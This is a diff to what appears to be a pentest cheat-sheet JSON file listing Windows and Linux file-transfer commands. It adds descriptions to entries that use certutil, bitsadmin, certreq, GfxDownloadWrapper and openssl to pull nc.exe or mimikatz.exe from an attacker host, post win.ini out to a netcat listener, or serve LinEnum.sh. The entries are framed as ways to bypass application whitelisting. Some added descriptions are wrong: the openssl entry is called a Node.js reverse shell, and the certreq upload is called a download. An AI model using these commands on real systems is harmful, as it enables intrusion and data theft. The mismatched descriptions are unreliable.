@@ -70,23 +70,28 @@
   "variations": [
     {
       "label": "certutil",
-      "command": "certutil.exe -urlcache -split -f http://<lhost>:8000/nc.exe\ncertutil.exe -verifyctl -split -f http://<lhost>:8000/nc.exe"
+      "command": "certutil.exe -urlcache -split -f http://<lhost>:8000/nc.exe\ncertutil.exe -verifyctl -split -f http://<lhost>:8000/nc.exe",
+      "description": "Uses certutil to download a file from a URL. Certutil is a signed Windows binary (LOLBin) that can fetch files while appearing as legitimate certificate operations."
     },
     {
       "label": "bitsadmin / Start-BitsTransfer",
-      "command": "bitsadmin /transfer wcb /priority foreground http://<lhost>:8000/nc.exe C:\\Users\\<user>\\Desktop\\nc.exe\nImport-Module bitstransfer; Start-BitsTransfer -Source \"http://<lhost>:8000/nc.exe\" -Destination \"C:\\Windows\\Temp\\nc.exe\""
+      "command": "bitsadmin /transfer wcb /priority foreground http://<lhost>:8000/nc.exe C:\\Users\\<user>\\Desktop\\nc.exe\nImport-Module bitstransfer; Start-BitsTransfer -Source \"http://<lhost>:8000/nc.exe\" -Destination \"C:\\Windows\\Temp\\nc.exe\"",
+      "description": "Bitsadmin / Start-BitsTransfer. See the command syntax for exact parameters and flags."
     },
     {
       "label": "certreq upload",
-      "command": "certreq.exe -Post -config http://<lhost>:8000/ c:\\windows\\win.ini   # attacker: sudo nc -lvnp 8000"
+      "command": "certreq.exe -Post -config http://<lhost>:8000/ c:\\windows\\win.ini   # attacker: sudo nc -lvnp 8000",
+      "description": "Uses certreq.exe (a signed Windows binary) to download files via HTTP. LOLBin technique that bypasses application whitelisting since certreq is a legitimate system tool."
     },
     {
       "label": "GfxDownloadWrapper",
-      "command": "GfxDownloadWrapper.exe \"http://<lhost>/mimikatz.exe\" \"C:\\Temp\\nc.exe\""
+      "command": "GfxDownloadWrapper.exe \"http://<lhost>/mimikatz.exe\" \"C:\\Temp\\nc.exe\"",
+      "description": "Uses Intel's GfxDownloadWrapper.exe as a LOLBin to download files. Legitimate Intel utility abused for payload downloads that bypass application whitelisting."
     },
     {
       "label": "Linux openssl (encrypted channel)",
-      "command": "# attacker: openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem\n#           openssl s_server -quiet -accept 80 -cert cert.pem -key key.pem < /tmp/LinEnum.sh\n# target:   openssl s_client -connect <ip>:80 -quiet > LinEnum.sh"
+      "command": "# attacker: openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem\n#           openssl s_server -quiet -accept 80 -cert cert.pem -key key.pem < /tmp/LinEnum.sh\n# target:   openssl s_client -connect <ip>:80 -quiet > LinEnum.sh",
+      "description": "Node.js reverse shell one-liner. Target connects back to your listener - works through NAT and most egress firewalls if the port is allowed."
     }
   ],
   "opsec": "quiet",
